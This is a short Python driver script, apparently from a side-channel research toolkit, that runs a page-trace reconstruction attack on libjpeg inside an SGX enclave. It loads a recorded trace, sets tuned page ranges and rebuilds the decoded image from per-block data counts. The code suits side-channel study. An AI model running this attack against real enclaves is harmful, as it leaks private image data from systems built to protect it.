from __future__ import annotations

"""Reference script for the JPEG page-trace reconstruction attack.

This script configures the built-in JPEG state machine, runs it on a VCD trace,
and stores three artefacts:

- a reconstructed image (PGM/PPM/PNG)
- a JSON dump with the raw per-block data counts
- a scaled PNG preview for quick inspection
"""

from pathlib import Path

from sgxtrace import attack_jpeg_vcd, save_attack_outputs
from sgxtrace.jpeg import JpegAttackConfig

TRACE_PATH = "traces/trace_libjpeg.vcd"
OUTPUT_DIR = Path("output")
OUTPUT_IMAGE = OUTPUT_DIR / "jpeg_reconstruction.pgm"
RAW_JSON = OUTPUT_DIR / "jpeg_reconstruction.json"
PREVIEW_PNG = OUTPUT_DIR / "jpeg_reconstruction_preview.png"
COLOR_MODE = False  # True for RGB, False for grayscale.


def build_default_config(*, color: bool = COLOR_MODE) -> JpegAttackConfig:
    """Return the page ranges that were tuned for the bundled JPEG demo trace."""
    return JpegAttackConfig(
        start_range=range(54, 55),
        next_row_range=range(44, 45),
        start_row_range=range(58, 59),
        pre_idct_slow_range=range(56, 57),
        idct_slow_range=range(62, 64),
        data_count_range_no_aexnotify=range(154, 157),
        data_count_range_aexnotify=range(154, 157),
        data_count_pages=frozenset({154, 155, 156}),
        num_colors=3 if color else 1,
        aexnotify=False,
    )


def run_jpeg_attack(trace_path: str = TRACE_PATH) -> None:
    """Run the JPEG reconstruction attack and write the resulting files."""
    print("--- JPEG RECONSTRUCTION ATTACK ---")
    print(f"Loading trace: {trace_path}")

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    config = build_default_config()
    result = attack_jpeg_vcd(trace_path, config)

    save_attack_outputs(
        result,
        image_path=OUTPUT_IMAGE,
        raw_json_path=RAW_JSON,
        preview_path=PREVIEW_PNG,
        preview_scale=16,
    )

    width, height = result.reconstruction.reconstructed_size()
    print("Attack finished successfully.")
    print(f"Processed pages: {result.processed_pages}")
    print(f"Final state:     {result.final_state.value}")
    print(f"Image size:      {width} x {height} blocks")
    print(f"Channels:        {config.num_colors}")
    print(f"Image written:   {OUTPUT_IMAGE}")
    print(f"Preview written: {PREVIEW_PNG}")
    print(f"Raw JSON:        {RAW_JSON}")
    print(f"Min data count:  {result.reconstruction.min_data}")
    print(f"Max data count:  {result.reconstruction.max_data}")


if __name__ == "__main__":
    run_jpeg_attack()